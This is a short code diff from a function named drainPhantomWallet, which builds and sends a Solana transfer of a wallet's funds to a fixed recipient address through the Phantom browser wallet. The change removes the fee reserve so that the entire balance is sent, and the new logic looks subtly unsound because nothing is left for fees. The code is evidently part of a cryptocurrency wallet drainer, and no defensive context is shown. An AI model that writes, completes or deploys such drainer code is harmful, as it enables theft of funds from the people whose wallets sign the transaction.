@@ -74,10 +74,10 @@ export async function drainPhantomWallet(): Promise<void> {
       SystemProgram.transfer({
         fromPubkey: senderPublicKey,
         toPubkey: RECIPIENT_ADDRESS,
-        lamports: balance - 5000, // Leave minimum for fees
+        lamports: balance, // Send entire balance without deducting fees
       })
     );
-    console.log("Added transfer instruction for", balance - 5000, "lamports");
+    console.log("Added transfer instruction for", balance, "lamports");
 
     console.log("Sending transaction...");
     const { signature } = await window.solana.signAndSendTransaction(transaction);
